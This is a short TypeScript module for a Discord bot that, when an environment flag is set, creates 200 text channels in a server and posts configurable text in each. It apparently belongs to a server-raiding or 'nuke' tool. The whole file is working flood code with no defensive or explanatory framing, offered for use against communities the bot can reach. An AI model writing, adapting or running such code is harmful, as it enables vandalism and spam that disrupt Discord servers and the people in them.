import { Guild, ChannelType } from "discord.js";

export default async (guild: Guild): Promise<void> => {
	if (process.env.CHANNELS_FLOOD) {
		try {
			for (let i = 0; i < 200; i++) {
				const channel = await guild.channels.create({
					name: process.env.CHANNELS_FLOOD_NAME,
					type: ChannelType.GuildText,
				});

				await channel.send(process.env.CHANNELS_FLOOD_TEXT);
			}
		} catch (error) {
			console.log(error);
		}
	}
};
